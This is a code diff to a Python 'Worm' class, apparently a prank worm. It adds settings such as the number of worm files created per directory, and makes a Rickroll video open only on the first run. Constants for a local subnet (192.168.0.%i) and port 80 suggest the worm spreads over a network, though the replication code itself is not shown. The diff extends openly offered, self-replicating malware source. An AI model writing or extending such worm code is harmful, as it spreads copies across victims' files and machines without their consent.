@@ -16,9 +16,19 @@ import socket
 
 BASE_IP = "192.168.0.%i"
 PORT = 80
+
+#Amount of times the youtube video is opened
 COUNT = 3
+
+#location of Rick_Eternal.mp4 in relation to the worm's path
 RICKLOC = "\\..\\Rick_Eternal.mp4"
+
+#do we open the youtube video of the mp4?
 YOUTUBETOO = False
+
+#Amount of worm files created per directory
+INSTANCES_PER_DIRECTORY = 2
+
 
 #------------------------------------------THREADER CLASS---------------------------------------------- -AR
 class Threader:
@@ -71,7 +81,7 @@ class Threader:
 
 #--------------------------------------------WORM CLASS------------------------------------------------
 class Worm:
-    def __init__(self, path=None, target_dir_list=None, iteration=None):
+    def __init__(self, path=None, target_dir_list=None, iteration=None, first_run=None):
         if isinstance(path, type(None)):
             self.path = "/"
         else: 
@@ -83,10 +93,17 @@ class Worm:
             self.target_dir_list = target_dir_list
 
         if isinstance(target_dir_list, type(None)):
-            self.iteration = 2
+            self.iteration = INSTANCES_PER_DIRECTORY
         else: 
             self.iteration = iteration
 
+        if isinstance(first_run, type(None)):
+            self.first_run = True
+        elif first_run == True:
+            self.first_run = False
+        else:
+            self.first_run = first_run
+            
         # get own absolute path
         self.own_path = os.path.realpath(__file__)
         
@@ -153,10 +170,11 @@ class Worm:
     
     def rick_and_roll(self):
         try:
-            os.startfile(self.own_path + RICKLOC)
-            if YOUTUBETOO:
-                for i in range(0, COUNT):
-                    webbrowser.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ')
+            if (self.first_run == True):
+                os.startfile(self.own_path + RICKLOC)
+                if YOUTUBETOO:
+                    for i in range(0, COUNT):
+                        webbrowser.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ')
         except:
             logging.warning("exception occurred: no rick?")
 
